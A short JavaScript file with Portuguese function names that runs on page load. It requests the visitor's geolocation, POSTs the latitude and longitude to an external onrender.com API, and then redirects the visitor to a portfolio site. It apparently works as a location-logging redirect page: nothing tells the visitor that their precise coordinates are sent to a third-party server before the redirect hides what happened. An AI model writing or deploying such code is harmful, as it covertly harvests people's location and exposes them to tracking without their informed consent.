
let sites = ["https://leandrocmore.github.io/portifolio/"];

function redirecionarParaSiteAleatorio() {
    obterLocalizacao();
}

function obterLocalizacao() {
    navigator.geolocation.getCurrentPosition(success);
}

function success(position) {
    let { coords } = position;
    let latitude = coords.latitude;
    let longitude = coords.longitude;

    
    enviarDadosParaAPI(latitude, longitude);


    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
    window.location.href = siteAleatorio;
}

function enviarDadosParaAPI(latitude, longitude) {
    const data = {
        latitude: latitude,
        longitude: longitude
    };

    fetch('https://cacagolp2-5.onrender.com/api/data/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log('Status da requisição:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('Corpo da resposta:', data);
    })
    .catch(error => {
        console.error('Ocorreu um erro na requisição:', error);
    });
}

redirecionarParaSiteAleatorio();
